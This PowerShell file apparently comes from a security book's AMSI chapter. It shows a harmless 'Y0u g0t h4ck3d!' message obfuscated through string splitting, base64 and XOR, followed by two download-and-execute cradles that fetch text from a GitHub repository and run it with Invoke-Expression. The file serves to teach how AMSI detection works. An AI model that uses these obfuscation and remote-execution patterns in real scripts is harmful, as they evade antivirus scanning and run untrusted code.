# Example 1
Function Invoke-MaliciousScript {
    Write-Host "Y0u g0t h4ck3d!"
}
Invoke-MaliciousScript

# Example 2
Function Invoke-MaliciousScript {
    $a = 4
    $output = "Y0" + "u g" + "0t h" + $a + "ck" + ($a - 1) + "d!"
    Write-Host $output
}
Invoke-MaliciousScript 

# Example 3 - Encoding
Function Invoke-MaliciousScript {
    $string = "Y0u g0t h4ck3d!"
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($string)
    $output =[Convert]::ToBase64String($Bytes)

    Write-Host $output
}
Invoke-MaliciousScript 

# Example 3 - Decoding
Function Invoke-MaliciousScript {
    $string = "WQAwAHUAIABnADAAdAAgAGgANABjAGsAMwBkACEA"
    $output = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($string))

    Write-Host $output
}
Invoke-MaliciousScript

# Example 4 - Encoding
Function Invoke-MaliciousScript {
    $string = "Y0u g0t h4ck3d!"
    $key = 0x12

    $bytes = [system.Text.Encoding]::UTF8.GetBytes($string)
    $xor = $bytes | ForEach-Object { [char] ($_ -bxor $key)}
    $output =[System.Convert]::ToBase64String($xor)

    Write-Host $output
}
Invoke-MaliciousScript 

# Example 4 - Decoding
Function Invoke-MaliciousScript {
    $string = "SyJnMnUiZjJ6JnF5IXYz"
    $key = 0x12
	
    $bytes = [System.Convert]::FromBase64String($string)
    $output = -join ($bytes | ForEach-Object { [char] ($_ -bxor $key)})

    Write-Host $output
}
Invoke-MaliciousScript

# Example 5
Function Invoke-MaliciousScript {
    $output = Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter12/AMSIExample5.txt
    Invoke-Expression $output
}
Invoke-MaliciousScript

# Example 6
Invoke-Expression (Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter12/AMSIExample6.txt)

Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' | Where-Object Id -eq 1116 | Format-List